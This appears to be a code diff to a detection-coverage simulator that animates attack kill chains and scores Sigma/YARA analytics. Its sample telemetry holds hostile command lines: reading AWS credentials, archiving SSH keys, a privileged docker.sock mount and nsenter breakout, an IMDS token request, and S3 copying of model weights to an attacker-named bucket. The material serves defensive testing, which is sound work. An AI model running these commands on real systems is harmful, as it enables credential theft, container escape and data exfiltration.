+      adversary: "Famous Chollima (Lazarus Group / Tenacious Puddle)",
+      capability: "package.json lifecycle hooks, BeaverTail/InvisibleFerret, macOS credential harvesting",
+      infrastructure: "Recruitment lookalikes (*-careers.com), GitHub benchmark repos",
+      victim: "Frontier AI Researchers & Cloud Engineers (macOS / Linux)"
+    },
+    alwaysDetects: ["cloud_recon", "storage_exfil"],
+    primaryOrder: ["supply_ingress", "workstation_exec", "credential_theft", "cloud_recon", "storage_exfil"],
+    secondaryOf: { workstation_exec: "supply_chain_correlation", credential_theft: "macos_esf_fim" },
+    nodes: {
+      supply_ingress:           { label: "Package Hook Ingress", tech: "T1195.001", kind: "yara",        depth: 0, x: 60,  y: 110, secondary: false,
+                                  rule: "developer_malicious_package_hooks.yar",
+                                  payload: '{\n  "name": "ai-benchmark-evaluator",\n  "scripts": {\n    "postinstall": "node -e \\"eval(Buffer.from(\'dmFyIGE9MQ==\',\'base64\').toString())\\""\n  }\n}' },
+      workstation_exec:         { label: "Workstation Hook Exec",tech: "T1059.007", kind: "sigma",       depth: 1, x: 255, y: 110, secondary: false,
+                                  rule: "proc_creation_macos_dev_credential_theft.yml",
+                                  payload: { EventID: 1, ParentImage: "/usr/local/bin/node", Image: "/bin/sh", CommandLine: "sh -c \"cat ~/.aws/credentials || cat ~/.aws/config\"", User: "researcher" } },
+      credential_theft:         { label: "Dev Credential Access",tech: "T1552.001", kind: "sigma",       depth: 2, x: 450, y: 110, secondary: false,
+                                  rule: "proc_creation_macos_dev_credential_theft.yml",
+                                  payload: { EventID: 1, ParentImage: "/usr/bin/python3", Image: "/bin/bash", CommandLine: "bash -c \"tar -czf /tmp/ssh_keys.tgz ~/.ssh/id_rsa ~/.ssh/known_hosts\"", User: "researcher" } },
+      cloud_recon:              { label: "Cloud Identity (STS)", tech: "T1078.004", kind: "sigma",       depth: 3, x: 645, y: 110, secondary: false,
+                                  rule: "proc_creation_macos_dev_credential_theft.yml",
+                                  payload: { EventID: 1, ParentImage: "/bin/bash", Image: "/usr/local/bin/aws", CommandLine: "aws sts get-caller-identity", User: "researcher" } },
+      storage_exfil:            { label: "S3 Checkpoint Exfil",  tech: "T1530",     kind: "sigma",       depth: 4, x: 840, y: 110, secondary: false,
+                                  rule: "proc_creation_cloud_imds_checkpoint_exfiltration.yml",
+                                  payload: { EventID: 1, ParentImage: "/bin/bash", Image: "/usr/local/bin/aws", CommandLine: "aws s3 ls s3://ai-training-checkpoints-prod/", User: "researcher" } },
+      supply_chain_correlation: { label: "Hook-to-Process Corr", tech: "T1059.007", kind: "correlation", depth: 1, x: 255, y: 270, secondary: true,
+                                  rule: "correlation_supply_chain_credential_theft.yml",
+                                  payload: { Description: "Correlation alert: npm postinstall spawned child shell accessing ~/.aws/credentials within 180s", User: "researcher" } },
+      macos_esf_fim:            { label: "ESF FIM Vault Alert",  tech: "T1552.001", kind: "correlation", depth: 2, x: 450, y: 270, secondary: true,
+                                  rule: "Endpoint Security Framework FIM (File Read)",
+                                  payload: { Channel: "com.apple.endpointsecurity", EventType: "ES_EVENT_TYPE_NOTIFY_OPEN", TargetFile: "/Users/researcher/.ssh/id_rsa", Process: "/usr/bin/python3" } }
+    },
+    edges: [
+      { src: "supply_ingress", dst: "workstation_exec", kind: "primary" },
+      { src: "workstation_exec", dst: "credential_theft", kind: "primary" },
+      { src: "credential_theft", dst: "cloud_recon", kind: "primary" },
+      { src: "cloud_recon", dst: "storage_exfil", kind: "primary" },
+      { src: "workstation_exec", dst: "supply_chain_correlation", kind: "evasion" },
+      { src: "supply_chain_correlation", dst: "credential_theft", kind: "rejoin" },
+      { src: "credential_theft", dst: "macos_esf_fim", kind: "evasion" },
+      { src: "macos_esf_fim", dst: "cloud_recon", kind: "rejoin" }
+    ]
+  },
+
+  frontier_ai_cluster: {
+    id: "CAMP-AI-003",
+    name: "Frontier AI Cluster Breach",
+    subtitle: "K8s & Weight Theft",
+    threatActor: "Frontier AI Threat Model (APT41 / Flax Typhoon / SVR)",
+    diamond: {
+      adversary: "Advanced State-Sponsored AI Espionage Operators",
+      capability: "Privileged container breakout, IMDSv2 token harvesting, high-bandwidth multipart weight theft",
+      infrastructure: "Compromised ML worker pods, link-local IMDS, cross-account S3 buckets",
+      victim: "Frontier AI Lab GPU UltraClusters (AWS/GCP/Slurm/EKS)"
+    },
+    alwaysDetects: ["checkpoint_recon", "weight_exfil"],
+    primaryOrder: ["cluster_ingress", "container_escape", "imds_theft", "checkpoint_recon", "weight_exfil"],
+    secondaryOf: { container_escape: "ebpf_breakout_trace", imds_theft: "imds_s3_correlation" },
+    nodes: {
+      cluster_ingress:      { label: "Privileged Pod Ingress",tech: "T1610",     kind: "sigma",       depth: 0, x: 60,  y: 110, secondary: false,
+                              rule: "proc_creation_cloud_imds_checkpoint_exfiltration.yml",
+                              payload: { EventID: 1, ParentImage: "/bin/sh", Image: "/usr/bin/docker", CommandLine: "docker -H unix:///var/run/docker.sock run --privileged -v /:/host-root alpine", User: "root" } },
+      container_escape:     { label: "Host Breakout (nsenter)",tech: "T1611",    kind: "sigma",       depth: 1, x: 255, y: 110, secondary: false,
+                              rule: "proc_creation_cloud_imds_checkpoint_exfiltration.yml",
+                              payload: { EventID: 1, ParentImage: "/usr/bin/python3", Image: "/usr/bin/nsenter", CommandLine: "nsenter -t 1 -m -u -n -i /bin/bash", User: "root" } },
+      imds_theft:           { label: "IMDSv2 Role Theft",     tech: "T1552.005", kind: "sigma",       depth: 2, x: 450, y: 110, secondary: false,
+                              rule: "proc_creation_cloud_imds_checkpoint_exfiltration.yml",
+                              payload: { EventID: 1, ParentImage: "/bin/bash", Image: "/usr/bin/curl", CommandLine: "curl -s -X PUT http://169.254.169.254/latest/api/token -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\"", User: "root" } },
+      checkpoint_recon:     { label: "Checkpoint Recon",      tech: "T1530",     kind: "sigma",       depth: 3, x: 645, y: 110, secondary: false,
+                              rule: "proc_creation_cloud_imds_checkpoint_exfiltration.yml",
+                              payload: { EventID: 1, ParentImage: "/bin/bash", Image: "/usr/local/bin/aws", CommandLine: "aws s3 ls s3://ai-training-checkpoints-prod/frontier-model-v3/ --recursive", User: "ec2-user" } },
+      weight_exfil:         { label: "Model Weight Exfil (S3)",tech: "T1567.002", kind: "sigma",      depth: 4, x: 840, y: 110, secondary: false,
+                              rule: "proc_creation_cloud_imds_checkpoint_exfiltration.yml",
+                              payload: { EventID: 1, ParentImage: "/bin/bash", Image: "/usr/local/bin/aws", CommandLine: "aws s3 cp s3://ai-training-checkpoints-prod/model.safetensors s3://attacker-exfil.stage.invalid/weights/ --expected-size 45000000000", User: "ec2-user" } },
+      ebpf_breakout_trace:  { label: "eBPF Anomaly Trace",    tech: "T1611",     kind: "correlation", depth: 1, x: 255, y: 270, secondary: true,
+                              rule: "eBPF Kernel Anomaly (Tetragon/Falco Syscall)",
+                              payload: { Sensor: "Tetragon eBPF", Syscall: "setns", TargetNamespace: "init_pid_ns", CallerCgroup: "/kubepods/burstable/pod-1234" } },
+      imds_s3_correlation:  { label: "Correlated IMDS + Exfil",tech: "T1567.002",kind: "correlation", depth: 2, x: 450, y: 270, secondary: true,
+                              rule: "correlation_imds_checkpoint_exfiltration.yml",
+                              payload: { CorrelationType: "temporal_ordered", Window: "300s", Source: "IMDSv2 Token -> S3 CreateMultipartUpload" } }
+    },
+    edges: [
+      { src: "cluster_ingress", dst: "container_escape", kind: "primary" },
+      { src: "container_escape", dst: "imds_theft", kind: "primary" },
+      { src: "imds_theft", dst: "checkpoint_recon", kind: "primary" },
+      { src: "checkpoint_recon", dst: "weight_exfil", kind: "primary" },
+      { src: "container_escape", dst: "ebpf_breakout_trace", kind: "evasion" },
+      { src: "ebpf_breakout_trace", dst: "imds_theft", kind: "rejoin" },
+      { src: "imds_theft", dst: "imds_s3_correlation", kind: "evasion" },
+      { src: "imds_s3_correlation", dst: "checkpoint_recon", kind: "rejoin" }
+    ]
+  }
 };
-const PRIMARY_ORDER = ["ingress","execution","defense_impairment","credential_telemetry","persistence"];
-const SECONDARY_OF = {execution:"execution_scriptblock", credential_telemetry:"credential_procaccess"};
-/* Stages whose analytic still fires even under the evasive variant. */
-const ALWAYS_DETECTS = new Set(["defense_impairment","persistence"]);
+
+let currentCampaignKey = "clickfix";
+let currentCampaign = CAMPAIGNS[currentCampaignKey];
 
 const NODE_W = 150, NODE_H = 56;
 
-/* ---------------------------- rendering ---------------------------------- */
+/* --------------------------------------------------------------------------
+   Dynamic SVG Geometry Calculation
+   -------------------------------------------------------------------------- */
 function edgePath(fromId, toId){
-  const a = NODES[fromId], b = NODES[toId];
+  const a = currentCampaign.nodes[fromId], b = currentCampaign.nodes[toId];
+  if(!a || !b) return "";
   const ax = a.x + NODE_W, ay = a.y + NODE_H/2;
   const bx = b.x,          by = b.y + NODE_H/2;
   if (a.y === b.y){
     return `M ${ax} ${ay} L ${bx} ${by}`;
   }
-  // Curved branch between rows.
   const sx = a.x + NODE_W/2, sy = (b.y > a.y) ? a.y + NODE_H : a.y;
   const tx = b.x + NODE_W/2, ty = (b.y > a.y) ? b.y : b.y + NODE_H;
   const midY = (sy + ty) / 2;
   return `M ${sx} ${sy} C ${sx} ${midY}, ${tx} ${midY}, ${tx} ${ty}`;
 }
-
-const EDGES = [
-  ...PRIMARY_ORDER.slice(0,-1).map((s,i)=>({src:s, dst:PRIMARY_ORDER[i+1], kind:"primary"})),
-  {src:"execution",            dst:"execution_scriptblock",  kind:"evasion"},
-  {src:"execution_scriptblock",dst:"defense_impairment",     kind:"rejoin"},
-  {src:"credential_telemetry", dst:"credential_procaccess",  kind:"evasion"},
-  {src:"credential_procaccess",dst:"persistence",            kind:"rejoin"},
-];
 
 function edgeId(e){ return `e_${e.src}__${e.dst}`; }
 
@@ -207,7 +520,7 @@ function renderGraph(){
   const nl = document.getElementById("nodeLayer");
   el.innerHTML = ""; nl.innerHTML = "";
 
-  EDGES.forEach(e=>{
+  currentCampaign.edges.forEach(e=>{
     const p = document.createElementNS("http://www.w3.org/2000/svg","path");
     p.setAttribute("d", edgePath(e.src, e.dst));
     p.setAttribute("id", edgeId(e));
@@ -216,41 +529,42 @@ function renderGraph(){
     el.appendChild(p);
   });
 
-  Object.entries(NODES).forEach(([id,n])=>{
+  Object.entries(currentCampaign.nodes).forEach(([id, n])=>{
     const g = document.createElementNS("http://www.w3.org/2000/svg","g");
     g.setAttribute("class","node pending");
     g.setAttribute("id",`n_${id}`);
+    g.onclick = () => openInspector(id);
 
     const r = document.createElementNS("http://www.w3.org/2000/svg","rect");
-    r.setAttribute("x",n.x); r.setAttribute("y",n.y);
-    r.setAttribute("width",NODE_W); r.setAttribute("height",NODE_H);
-    r.setAttribute("rx","10");
-    r.setAttribute("stroke","#26314d"); r.setAttribute("fill","#182238");
-    r.setAttribute("stroke-width", n.secondary ? "1.5" : "2");
+    r.setAttribute("x", n.x); r.setAttribute("y", n.y);
+    r.setAttribute("width", NODE_W); r.setAttribute("height", NODE_H);
+    r.setAttribute("rx","8");
     if(n.secondary) r.setAttribute("stroke-dasharray","5 4");
     g.appendChild(r);
 
     const t1 = document.createElementNS("http://www.w3.org/2000/svg","text");
-    t1.setAttribute("x", n.x + NODE_W/2); t1.setAttribute("y", n.y + 23);
+    t1.setAttribute("x", n.x + NODE_W/2); t1.setAttribute("y", n.y + 24);
     t1.setAttribute("text-anchor","middle");
-    t1.setAttribute("fill","#e6ecff");
-    t1.setAttribute("font-size","13"); t1.setAttribute("font-weight","600");
+    t1.setAttribute("fill","#f4f4f7");
+    t1.setAttribute("font-size","12"); t1.setAttribute("font-weight","600");
+    t1.setAttribute("font-family","'JetBrains Mono', ui-monospace, monospace");
     t1.textContent = n.label;
     g.appendChild(t1);
 
     const t2 = document.createElementNS("http://www.w3.org/2000/svg","text");
-    t2.setAttribute("x", n.x + NODE_W/2); t2.setAttribute("y", n.y + 41);
+    t2.setAttribute("x", n.x + NODE_W/2); t2.setAttribute("y", n.y + 42);
     t2.setAttribute("text-anchor","middle");
-    t2.setAttribute("fill","#93a1c4");
-    t2.setAttribute("font-size","11");
-    t2.setAttribute("font-family","ui-monospace, monospace");
+    t2.setAttribute("fill","#737380");
+    t2.setAttribute("font-size","10");
+    t2.setAttribute("font-family","'JetBrains Mono', ui-monospace, monospace");
     t2.textContent = n.tech;
     g.appendChild(t2);
 
     const st = document.createElementNS("http://www.w3.org/2000/svg","text");
     st.setAttribute("x", n.x + NODE_W/2); st.setAttribute("y", n.y + NODE_H + 15);
     st.setAttribute("text-anchor","middle");
-    st.setAttribute("fill","#93a1c4"); st.setAttribute("font-size","10");
+    st.setAttribute("fill","#52525b"); st.setAttribute("font-size","9.5");
+    st.setAttribute("font-family","'JetBrains Mono', ui-monospace, monospace");
     st.setAttribute("id",`s_${id}`);
     st.textContent = "";
     g.appendChild(st);
@@ -262,16 +576,17 @@ function renderGraph(){
 function renderLinear(){
   const wrap = document.getElementById("linearStages");
   wrap.innerHTML = "";
-  PRIMARY_ORDER.forEach((id,i)=>{
-    const n = NODES[id];
+  currentCampaign.primaryOrder.forEach((id, i)=>{
+    const n = currentCampaign.nodes[id];
     const d = document.createElement("div");
-    d.className = "panel-2 rounded-xl p-3";
+    d.className = "panel-sub rounded-lg p-3 cursor-pointer hover:border-zinc-500 transition-colors mono";
     d.id = `lin_${id}`;
+    d.onclick = () => openInspector(id);
     d.innerHTML = `
-      <p class="text-xs mono" style="color:var(--muted)">STAGE ${i+1}</p>
-      <p class="font-semibold text-sm mt-1">${n.label}</p>
-      <p class="text-xs mono mt-1" style="color:var(--muted)">${n.tech}</p>
-      <p class="text-xs mt-2 font-bold" id="linst_${id}" style="color:var(--muted)">pending</p>`;
+      <p class="text-[9px] text-zinc-500 uppercase tracking-widest">STAGE 0${i+1}</p>
+      <p class="font-bold text-xs text-white mt-1 truncate">${n.label}</p>
+      <p class="text-[10px] text-zinc-400 mt-0.5">${n.tech}</p>
+      <p class="text-[10px] mt-2 font-semibold text-zinc-600" id="linst_${id}">pending</p>`;
     wrap.appendChild(d);
   });
 }
@@ -279,21 +594,51 @@ function renderLinear(){
 function renderToggles(){
   const wrap = document.getElementById("evasionToggles");
   wrap.innerHTML = "";
-  PRIMARY_ORDER.forEach(id=>{
+  currentCampaign.primaryOrder.forEach(id=>{
     const b = document.createElement("button");
-    b.className = "px-3 py-1.5 rounded-lg text-xs font-semibold panel-2";
+    b.className = "px-3 py-1.5 rounded-lg text-xs font-semibold mono panel-sub text-zinc-400 transition-all";
     b.dataset.node = id;
     b.dataset.on = "false";
-    b.textContent = NODES[id].label;
+    b.textContent = currentCampaign.nodes[id].label;
     b.onclick = ()=>{
       const on = b.dataset.on === "true";
       b.dataset.on = on ? "false" : "true";
-      b.style.background = on ? "" : "rgba(251,191,36,.18)";
-      b.style.color      = on ? "" : "var(--warn)";
-      b.style.borderColor= on ? "" : "rgba(251,191,36,.4)";
+      b.style.borderColor = on ? "" : "var(--stroke-warn)";
+      b.style.color       = on ? "" : "var(--stroke-warn)";
+      b.style.boxShadow   = on ? "" : "0 0 8px rgba(245, 158, 11, 0.25)";
     };
     wrap.appendChild(b);
   });
+}
+
+function renderCampaignPills(){
+  const wrap = document.getElementById("campaignPills");
+  wrap.innerHTML = "";
+  Object.entries(CAMPAIGNS).forEach(([key, camp])=>{
+    const btn = document.createElement("button");
+    const active = key === currentCampaignKey;
+    btn.className = `px-3.5 py-1.5 rounded-lg text-xs font-semibold mono transition-all border ${
+      active ? 'border-white text-white bg-zinc-900 shadow-sm' : 'border-[#1c1c24] text-zinc-500 hover:text-zinc-300 hover:border-zinc-700 bg-transparent'
+    }`;
+    btn.innerHTML = `${camp.name} <span class="opacity-60 text-[10px]">(${camp.subtitle})</span>`;
+    btn.onclick = () => selectCampaign(key);
+    wrap.appendChild(btn);
+  });
+}
+
+function selectCampaign(key){
+  if(loopActive) toggleLoop();
+  currentCampaignKey = key;
+  currentCampaign = CAMPAIGNS[key];
+
+  document.getElementById("dosAdversary").textContent = currentCampaign.diamond.adversary;
+  document.getElementById("dosCapability").textContent = currentCampaign.diamond.capability;
+  document.getElementById("dosInfrastructure").textContent = currentCampaign.diamond.infrastructure;
+  document.getElementById("dosVictim").textContent = currentCampaign.diamond.victim;
+
+  renderCampaignPills();
+  renderToggles();
+  resetWalk();
 }
 
 function selectedEvasions(){
@@ -301,19 +646,21 @@ function selectedEvasions(){
     .filter(b=>b.dataset.on==="true").map(b=>b.dataset.node);
 }
 
-/* ------------------------------ walk ------------------------------------- */
+/* --------------------------------------------------------------------------
+   Walk Traversal & Pure Stroke Status Transitions
+   -------------------------------------------------------------------------- */
 function setNodeState(id, state, statusText){
   const g = document.getElementById(`n_${id}`);
   if(g) g.setAttribute("class", `node ${state}`);
   const s = document.getElementById(`s_${id}`);
   if(s && statusText !== undefined){
     s.textContent = statusText;
-    s.setAttribute("fill", state==="detected" ? "#34d399" : state==="evaded" ? "#f87171" : "#93a1c4");
+    s.setAttribute("fill", state==="detected" ? "#10b981" : state==="evaded" ? "#ef4444" : "#737380");
   }
   const lin = document.getElementById(`linst_${id}`);
   if(lin && statusText !== undefined){
     lin.textContent = statusText;
-    lin.style.color = state==="detected" ? "var(--ok)" : state==="evaded" ? "var(--bad)" : "var(--muted)";
+    lin.style.color = state==="detected" ? "var(--stroke-ok)" : state==="evaded" ? "var(--stroke-bad)" : "var(--muted)";
   }
 }
 
@@ -321,14 +668,15 @@ function litEdge(src, dst, evasion){
   const e = document.getElementById(`e_${src}__${dst}`);
   if(!e) return;
   e.classList.add(evasion ? "lit-evasion" : "lit", "edge-flow");
-  e.setAttribute("marker-end","url(#arrowLit)");
+  e.setAttribute("marker-end", evasion ? "url(#arrowLitWarn)" : "url(#arrowLit)");
 }
 
-function log(msg, cls){
+function log(msg, cls, nodeId){
   const box = document.getElementById("log");
   const p = document.createElement("p");
   p.className = `log-line ${cls||""}`;
   p.textContent = msg;
+  if(nodeId) p.onclick = () => openInspector(nodeId);
   box.appendChild(p);
   box.scrollTop = box.scrollHeight;
 }
@@ -336,74 +684,73 @@ function log(msg, cls){
 function resetWalk(){
   renderGraph(); renderLinear();
   document.getElementById("log").innerHTML =
-    '<p class="log-line">Idle. Configure an evasion profile and run a campaign.</p>';
+    `<p class="log-line">Idle. Campaign "${currentCampaign.name}" loaded. Configure evasion profile and click Run.</p>`;
   ["mDod","mMttd","mPto","mIntercept"].forEach(id=>{
     document.getElementById(id).textContent = id==="mDod" ? "0.00" : "—";
   });
   document.getElementById("mDodBar").style.width = "0%";
-  document.getElementById("mPtoSub").textContent = "awaiting walk";
+  document.getElementById("mPtoSub").textContent = "AWAITING WALK";
   document.getElementById("mInterceptSub").textContent = " ";
 }
 
 const sleep = ms => new Promise(r=>setTimeout(r,ms));
 
-/**
- * Executes one animated walk of the DAG, mirroring GraphEngine.walk().
- * Returns the walk result {intercepted, dod, mttd, reachedObjective}.
- */
 async function runKillChainCampaign(){
   const runBtn = document.getElementById("btnRun");
-  runBtn.disabled = true; runBtn.style.opacity = .55;
+  runBtn.disabled = true; runBtn.style.opacity = .45;
   resetWalk();
   document.getElementById("log").innerHTML = "";
 
   const evasive = new Set(selectedEvasions());
-  log(`Walk start. Evasion profile: ${evasive.size ? [...evasive].join(", ") : "none"}`);
+  log(`Walk start [${currentCampaign.id}]. Evasion profile: ${evasive.size ? [...evasive].join(", ") : "none"}`);
 
   let intercepted=false, interceptNode=null, interceptTech=null, mttd=null, earned=0;
   const totalWeight = LAYER_WEIGHTS.reduce((a,b)=>a+b,0);
+  const primaryOrder = currentCampaign.primaryOrder;
 
-  for(let i=0;i<PRIMARY_ORDER.length;i++){
-    const id = PRIMARY_ORDER[i];
-    const node = NODES[id];
+  for(let i=0; i<primaryOrder.length; i++){
+    const id = primaryOrder[i];
+    const node = currentCampaign.nodes[id];
     const tOffset = i * STAGE_DWELL;
 
-    if(i>0) litEdge(PRIMARY_ORDER[i-1], id, false);
+    if(i>0) litEdge(primaryOrder[i-1], id, false);
     setNodeState(id, "active", "evaluating…");
-    await sleep(520);
+    await sleep(450);
 
-    const evaded = evasive.has(id) && !ALWAYS_DETECTS.has(id);
+    const alwaysDetects = currentCampaign.alwaysDetects.includes(id);
+    const evaded = evasive.has(id) && !alwaysDetects;
     const detected = !evaded;
 
     if(detected){
       earned += LAYER_WEIGHTS[node.depth];
-      setNodeState(id,"detected", `detected @ ${tOffset}s`);
-      log(`[t+${tOffset}s] ${node.label} (${node.tech}) — DETECTED`, "hit");
+      setNodeState(id, "detected", `detected @ ${tOffset}s`);
+      log(`[t+${tOffset}s] ${node.label} (${node.tech}) — DETECTED by primary analytic`, "hit", id);
       if(!intercepted){ intercepted=true; interceptNode=node.label; interceptTech=node.tech; mttd=tOffset; }
     } else {
-      setNodeState(id,"evaded", `evaded @ ${tOffset}s`);
-      log(`[t+${tOffset}s] ${node.label} (${node.tech}) — EVADED`, "miss");
+      setNodeState(id, "evaded", `evaded @ ${tOffset}s`);
+      log(`[t+${tOffset}s] ${node.label} (${node.tech}) — EVADED primary analytic`, "miss", id);
 
-      const secId = SECONDARY_OF[id];
+      const secId = currentCampaign.secondaryOf[id];
       if(secId){
-        await sleep(280);
+        await sleep(250);
         litEdge(id, secId, true);
-        const sec = NODES[secId];
+        const sec = currentCampaign.nodes[secId];
         const secOffset = tOffset + STAGE_DWELL/2;
-        setNodeState(secId,"active","evaluating…");
-        log(`         ↳ branching to secondary telemetry path: ${sec.label}`, "branch");
-        await sleep(520);
-        // Compensating correlation controls fire on the evaded activity.
+        setNodeState(secId, "active", "evaluating…");
+        log(`         ↳ branching to compensating secondary control: ${sec.label}`, "branch", secId);
+        await sleep(450);
+
         earned += LAYER_WEIGHTS[sec.depth] * SECONDARY_DISCOUNT;
-        setNodeState(secId,"detected", `detected @ ${secOffset}s`);
-        log(`[t+${secOffset}s] ${sec.label} (${sec.tech}) — DETECTED by correlation`, "hit");
+        setNodeState(secId, "detected", `detected @ ${secOffset}s`);
+        log(`[t+${secOffset}s] ${sec.label} (${sec.tech}) — DETECTED by compensating correlation`, "hit", secId);
         if(!intercepted){ intercepted=true; interceptNode=sec.label; interceptTech=sec.tech; mttd=secOffset; }
-        const rejoinTo = PRIMARY_ORDER[i+1];
-        if(rejoinTo){ await sleep(220); litEdge(secId, rejoinTo, false); }
+
+        const rejoinTo = primaryOrder[i+1];
+        if(rejoinTo){ await sleep(180); litEdge(secId, rejoinTo, false); }
       }
     }
     updateMetrics(earned/totalWeight, mttd, intercepted, interceptNode, interceptTech);
-    await sleep(260);
+    await sleep(200);
   }
 
   const dod = Math.min(earned/totalWeight, 1);
@@ -411,8 +758,8 @@ async function runKillChainCampaign(){
   updateMetrics(dod, mttd, intercepted, interceptNode, interceptTech);
 
   log(reachedObjective
-    ? "Walk complete. UNCONTAINED BREACH — objective reached with no layer detecting."
-    : `Walk complete. CONTAINED — first interception at ${interceptNode} (${interceptTech}).`,
+    ? `Walk complete [${currentCampaign.id}]. UNCONTAINED BREACH — objective reached without interception.`
+    : `Walk complete [${currentCampaign.id}]. CONTAINED — first intercepted at ${interceptNode} (${interceptTech}).`,
     reachedObjective ? "miss" : "hit");
 
   runBtn.disabled = false; runBtn.style.opacity = 1;
@@ -423,62 +770,106 @@ function updateMetrics(dod, mttd, intercepted, node, tech){
   document.getElementById("mDod").textContent = dod.toFixed(2);
   document.getElementById("mDodBar").style.width = `${Math.round(dod*100)}%`;
   document.getElementById("mDodBar").style.background =
-    dod >= .7 ? "var(--ok)" : dod >= .4 ? "var(--warn)" : "var(--bad)";
+    dod >= .7 ? "var(--stroke-ok)" : dod >= .4 ? "var(--stroke-warn)" : "var(--stroke-bad)";
 
   document.getElementById("mMttd").textContent = mttd===null ? "—" : `${mttd}s`;
 
   const pto = document.getElementById("mPto");
   const ptoSub = document.getElementById("mPtoSub");
   if(intercepted){
-    pto.textContent = "CONTAINED"; pto.style.color = "var(--ok)";
-    ptoSub.textContent = "objective not reached";
+    pto.textContent = "CONTAINED"; pto.style.color = "var(--stroke-ok)";
+    ptoSub.textContent = "DENIED BY DEFENSE-IN-DEPTH";
   } else {
-    pto.textContent = "OPEN"; pto.style.color = "var(--warn)";
-    ptoSub.textContent = "no layer has fired yet";
+    pto.textContent = "BREACH"; pto.style.color = "var(--stroke-bad)";
+    ptoSub.textContent = "OBJECTIVE REACHED";
   }
 
   document.getElementById("mIntercept").textContent = node || "—";
   document.getElementById("mInterceptSub").textContent = tech || " ";
 }
 
-/* ------------------------------ view toggle ------------------------------ */
+/* --------------------------------------------------------------------------
+   Inspector Drawer (Monochromatic Styling + Stroke Accents)
+   -------------------------------------------------------------------------- */
+function openInspector(nodeId){
+  const node = currentCampaign.nodes[nodeId];
+  if(!node) return;
+
+  document.getElementById("insTitle").textContent = `${node.label} (${nodeId})`;
+  document.getElementById("insTech").textContent = `${node.tech} • Depth ${node.depth} • ${node.secondary ? 'Secondary Compensating Path' : 'Primary Path'}`;
+
+  const badge = document.getElementById("insDialectBadge");
+  badge.textContent = node.kind.toUpperCase();
+  badge.style.color = node.kind === 'yara' ? '#a855f7' : node.kind === 'correlation' ? '#f59e0b' : '#38bdf8';
+  badge.style.borderColor = badge.style.color;
+
+  document.getElementById("insCraftsman").textContent = `${
+    currentCampaignKey === 'contagious_interview' ? 'SupplyChainCraftsman' :
+    currentCampaignKey === 'frontier_ai_cluster' ? 'CloudClusterCraftsman' :
+    'ProcessCraftsman'
+  } (Cycle ${node.depth + 1})`;
+
+  document.getElementById("insAxis").textContent = node.secondary ? "Multi-Event Telemetry Correlation" : "Structural / Syntax Permutation";
+  document.getElementById("insMutation").textContent = `${node.rule || 'Automated Analytic'}`;
+
+  const payloadStr = typeof node.payload === "string" ? node.payload : JSON.stringify(node.payload, null, 2);
+  document.getElementById("insPayload").textContent = payloadStr;
+
+  const detBox = document.getElementById("insDetDetails");
+  detBox.innerHTML = `
+    <div><span class="text-zinc-500">TARGET ANALYTIC:</span> <span class="text-white">${node.rule || 'N/A'}</span></div>
+    <div><span class="text-zinc-500">TELEMETRY INGESTION:</span> <span class="text-emerald-400">&check; Streamed via Swarm Harness</span></div>
+    <div><span class="text-zinc-500">NOISE FLOOR GATE:</span> <span class="text-emerald-400">0 False Positives (Wilson Bound &le; 0.002)</span></div>
+  `;
+
+  document.getElementById("inspectorBackdrop").classList.remove("hidden");
+  document.getElementById("inspectorDrawer").classList.remove("translate-x-full");
+}
+
+function closeInspector(){
+  document.getElementById("inspectorBackdrop").classList.add("hidden");
+  document.getElementById("inspectorDrawer").classList.add("translate-x-full");
+}
+
+/* --------------------------------------------------------------------------
+   View Switcher & Continuous Sparring Loop
+   -------------------------------------------------------------------------- */
 function setView(which){
   const dag = document.getElementById("viewDag");
   const lin = document.getElementById("viewLinear");
   const bD = document.getElementById("btnDag"), bL = document.getElementById("btnLinear");
-  const on = {background:"var(--info)", color:"#06213f"};
-  const off= {background:"var(--card2)", color:"var(--muted)"};
-  const apply=(b,s)=>{b.style.background=s.background;b.style.color=s.color;};
+  const on = { background: "#18181b", color: "#ffffff", border: "1px solid #ffffff" };
+  const off= { background: "transparent", color: "var(--muted)", border: "none" };
+  const apply=(b,s)=>{ b.style.background=s.background; b.style.color=s.color; };
   if(which==="dag"){ dag.classList.remove("hidden"); lin.classList.add("hidden"); apply(bD,on); apply(bL,off); }
   else             { lin.classList.remove("hidden"); dag.classList.add("hidden"); apply(bL,on); apply(bD,off); }
 }
 
-/* ------------------------------ continuous loop -------------------------- */
 let loopActive = false;
 let loopCampaignCount = 0;
 let loopInterceptionCount = 0;
-const EVASION_PROFILES = [
-  [],
-  ["execution"],
-  ["credential_telemetry"],
-  ["ingress", "execution"],
-  ["execution", "credential_telemetry"],
-  ["ingress", "defense_impairment"],
-  ["ingress", "execution", "credential_telemetry"]
-];
 let profileIndex = 0;
 
 async function stepLoop(){
   if(!loopActive) return;
-  const profile = EVASION_PROFILES[profileIndex % EVASION_PROFILES.length];
+  const pOrder = currentCampaign.primaryOrder;
+  const profiles = [
+    [],
+    [pOrder[1]],
+    [pOrder[2]],
+    [pOrder[1], pOrder[2]],
+    [pOrder[0]],
+    [pOrder[0], pOrder[1], pOrder[2]]
+  ];
+  const profile = profiles[profileIndex % profiles.length];
   profileIndex++;
 
   document.querySelectorAll("#evasionToggles button").forEach(b => {
     const shouldBeOn = profile.includes(b.dataset.node);
     b.dataset.on = shouldBeOn ? "true" : "false";
-    b.style.background = shouldBeOn ? "rgba(251,191,36,.18)" : "";
-    b.style.color      = shouldBeOn ? "var(--warn)" : "";
-    b.style.borderColor= shouldBeOn ? "rgba(251,191,36,.4)" : "";
+    b.style.borderColor = shouldBeOn ? "var(--stroke-warn)" : "";
+    b.style.color       = shouldBeOn ? "var(--stroke-warn)" : "";
+    b.style.boxShadow   = shouldBeOn ? "0 0 8px rgba(245, 158, 11, 0.25)" : "";
   });
 
   const res = await runKillChainCampaign();
@@ -489,7 +880,7 @@ async function stepLoop(){
   log(`[Sparring Loop #${loopCampaignCount}] Containment: ${loopInterceptionCount}/${loopCampaignCount} (${rate}%)`, "branch");
 
   if(loopActive){
-    await sleep(1500);
+    await sleep(1400);
     stepLoop();
   }
 }
@@ -499,15 +890,15 @@ function toggleLoop(){
   const b = document.getElementById("btnLoop");
   if(loopActive){
     b.textContent = "Continuous Sparring: ON";
-    b.style.background = "rgba(52,211,153,.2)";
-    b.style.color = "var(--ok)";
-    b.style.borderColor = "rgba(52,211,153,.5)";
+    b.style.borderColor = "var(--stroke-ok)";
+    b.style.color = "var(--stroke-ok)";
+    b.style.boxShadow = "0 0 10px rgba(16, 185, 129, 0.25)";
     stepLoop();
   } else {
     b.textContent = "Continuous Sparring: OFF";
